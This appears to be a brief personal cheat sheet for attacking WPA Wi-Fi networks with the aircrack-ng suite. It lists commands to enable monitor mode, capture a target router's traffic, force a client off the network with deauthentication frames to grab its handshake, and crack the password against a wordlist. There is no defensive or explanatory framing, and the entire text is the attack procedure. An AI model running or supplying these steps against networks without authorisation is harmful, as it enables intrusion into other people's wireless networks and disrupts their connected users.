# WPA Wi-FI Attack

## Capture
- airmon-ng
- airmon-ng start wlan0
- airodump-ng mon0
- airodump-ng -c 6 --bssid <router> -w /root/Desktop/ mon0
- aireplay-ng -0 2 -a <router> -c <client> mon0
## Crack Password
- aircrack-ng -a2 -b <router> -w /usr/share/wordlists/fern-wifi/common.txt /Root/Desktop/*.cap


